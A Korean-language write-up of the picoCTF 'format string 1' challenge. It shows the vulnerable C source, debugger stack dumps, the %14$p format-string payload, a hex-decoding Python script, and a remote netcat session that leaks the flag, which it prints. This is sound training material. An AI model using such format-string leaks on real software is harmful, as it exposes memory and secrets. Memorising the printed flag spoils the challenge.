# [format string 1](https://play.picoctf.org/practice/challenge/434?category=6&difficulty=2&originalEvent=73&page=1)
<br />

**Description:**
> Patrick and Sponge Bob were really happy with those orders you made for them, but now they're curious about the secret menu. Find it, and along the way, maybe you'll find something else of interest!
<br />

**Source Code:**
```c
#include <stdio.h>

int main() {
  char buf[1024];
  char secret1[64];
  char flag[64];
  char secret2[64];

  // Read in first secret menu item
  FILE *fd = fopen("secret-menu-item-1.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-1.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret1, 64, fd);
  // Read in the flag
  fd = fopen("flag.txt", "r");
  if (fd == NULL){
    printf("'flag.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(flag, 64, fd);
  // Read in second secret menu item
  fd = fopen("secret-menu-item-2.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-2.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret2, 64, fd);

  printf("Give me your order and I'll read it back to you:\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your order: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  printf("Bye!\n");
  fflush(stdout);

  return 0;
}

```
<br />

# 1. FLAG 오프셋 구하기
```bash
$ cat secret-menu-item-1.txt
BBBBBBBB
$ cat flag.txt
pico{this_is_flag}
$ cat secret-menu-item-2.txt
AAAAAAAA
```
분석을 위해 텍스트 파일 3개를 새로 생성합니다.

```yaml
pwndbg> b *main+275
Breakpoint 1 at 0x401309
pwndbg> r
...
Give me your order and I'll read it back to you:
CCCCCCCC
```
위 처럼 진행 후 스택을 확인하면 다음과 같습니다.
```yaml
pwndbg> x/30gx $rsp
0x7fffffffdb60: 0x4141414141414141      0x00007fffffff000a
0x7fffffffdb70: 0x00007fffffffdbb4      0x00007ffff7dcd600
0x7fffffffdb80: 0x00007ffff7fbf6c0      0x0000000000000003
0x7fffffffdb90: 0x00007fff00000000      0x00007ffff7ffe6b0
0x7fffffffdba0: 0x6968747b6f636970      0x616c665f73695f73
0x7fffffffdbb0: 0x00000000000a7d67      0x0000000000000000
0x7fffffffdbc0: 0x0000000000000000      0x00007fffffffdd50
0x7fffffffdbd0: 0x00007ffff7ffe6b0      0x00007ffff7ff287a
0x7fffffffdbe0: 0x4242424242424242      0x00007fffffff000a
0x7fffffffdbf0: 0x000000003de00ec7      0x00007ffff7fd111c
0x7fffffffdc00: 0x0000000000000001      0x00007fffffffdd50
0x7fffffffdc10: 0x0000000000000000      0x0000000000000000
0x7fffffffdc20: 0x4343434343434343      0x00007ffff7ffe300
0x7fffffffdc30: 0x00007ffff7ffe310      0x00007ffff7dd6cd8
0x7fffffffdc40: 0x00007fffffffdc90      0x00007ffff7ffe6b0
```
위에서부터 `0x7fffffffdb60`은 secret1, `0x7fffffffdba0`은 flag, `0x7fffffffdbe0`은 secret2 마지막으로 `0x7fffffffdc20`은 buf 입니다. 따라서 포맷스트링 인자 기준 flag의 오프셋은 14 입니다.
> [!NOTE]
포맷스트링 인자는 출력될 때, `rsi`, `rcx`, `rdx`, `r8`, `r9`, `rsp`, `rsp+8`, `rsp+0x10`, ... 순으로 출력이 됩니다. 따라서 flag의 오프셋은 14인 것입니다.
<br />

```bash
$ ./format-string-1
Give me your order and I'll read it back to you:
%14$p|%15$p|%16$p
Here's your order: 0x6968747b6f636970|0x616c665f73695f73|0xa7d67
Bye!
```
출력된 결과를 아스키로 바꾸면 FLAG를 얻을 수 있습니다.

```python
data = "0x6968747b6f636970|0x616c665f73695f73|0xa7d67"
data = data.split("|")

res = ""
for p in data:
    if p.startswith("0x"):
        hex_str = p[2:]
        if len(hex_str) % 2 != 0:
            hex_str = "0" + hex_str
        ascii_str = bytes.fromhex(hex_str)[::-1].decode("latin1", errors="ignore")
        res += ascii_str

print(res)
```
```bash
$ python3 test.py
pico{this_is_flag}
```
<br />

**Remote:**
```bash
$ nc mimas.picoctf.net 63454
Give me your order and I'll read it back to you:
%14$p|%15$p|%16$p|%17$p|%18$p
Here's your order: 0x7b4654436f636970|0x355f31346d316e34|0x3478345f33317937|0x34365f673431665f|0x7d363131373732
Bye!
```
```bash
$ python3 test.py
picoCTF{4n1m41_57y13_4x4_f14g_64277116}
```
